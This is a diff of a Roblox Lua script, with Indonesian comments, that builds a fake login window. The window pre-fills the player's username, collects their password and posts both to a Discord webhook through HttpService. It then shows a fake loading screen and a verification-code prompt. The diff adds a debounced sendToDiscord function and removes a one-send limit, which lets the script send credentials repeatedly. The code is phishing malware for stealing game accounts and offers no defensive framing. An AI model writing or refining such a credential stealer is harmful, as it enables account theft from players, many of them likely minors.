@@ -327,6 +327,34 @@ end
 end)
 end
 
+-- Tambahkan fungsi anti-spam
+local sentData = {}
+local debounceTime = 5 -- waktu delay (detik)
+
+local function sendToDiscord(data)
+    local currentTime = tick()
+    local identifier = tostring(data)
+
+    if sentData[identifier] and (currentTime - sentData[identifier] < debounceTime) then
+        print("Spam detected. Data not sent.")
+        return
+    end
+
+    local webhookUrl = "https://your-webhook-url"
+    local httpService = game:GetService("HttpService")
+
+    local success, response = pcall(function()
+        return httpService:PostAsync(webhookUrl, data, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if success then
+        print("Data sent successfully:", response)
+        sentData[identifier] = currentTime
+    else
+        warn("Failed to send data:", response)
+    end
+end
+
 -- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
@@ -338,9 +366,8 @@ local function createLoginGUI()
     local loginButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel") -- Error label untuk validasi
 
-    -- Variabel untuk password asli dan kontrol pengiriman data
+    -- Variabel untuk password asli
     local password = ""
-    local isDataSent = false
 
     -- Ambil username otomatis dari LocalPlayer
     local username = game.Players.LocalPlayer.Name
@@ -390,8 +417,8 @@ local function createLoginGUI()
     usernameBox.TextSize = 14
     usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    usernameBox.TextEditable = false -- Nonaktifkan input manual
-    usernameBox.Text = username -- Isi otomatis dengan username pengguna
+    usernameBox.TextEditable = false
+    usernameBox.Text = username
 
     -- Password Box
     passwordBox.Name = "PasswordBox"
@@ -405,7 +432,6 @@ local function createLoginGUI()
     passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Sensor Password Secara Manual
     passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
         local currentText = passwordBox.Text
         if #currentText > #password then
@@ -441,23 +467,16 @@ local function createLoginGUI()
 
     -- Fungsi Tombol Login
     loginButton.MouseButton1Click:Connect(function()
-        if isDataSent then
-            return -- Hentikan jika data sudah terkirim
-        end
-
-        -- Validasi input password kosong
-        if password == "" then
-            errorLabel.Text = "Password Tidak Boleh Kosong"
+        if #password < 8 then
+            errorLabel.Text = "Password minimal 8 karakter!"
             return
         end
 
-        -- Kirim data ke Discord
         sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
-        isDataSent = true -- Tandai bahwa data sudah terkirim
-        errorLabel.Text = "" -- Bersihkan error
+        errorLabel.Text = ""
         print("Data berhasil terkirim ke Discord!")
 
-        gui:Destroy() -- Hapus GUI setelah sukses
+        gui:Destroy()
         createLoadingGUI(3, function()
             createVerificationCodeGUI()
         end)
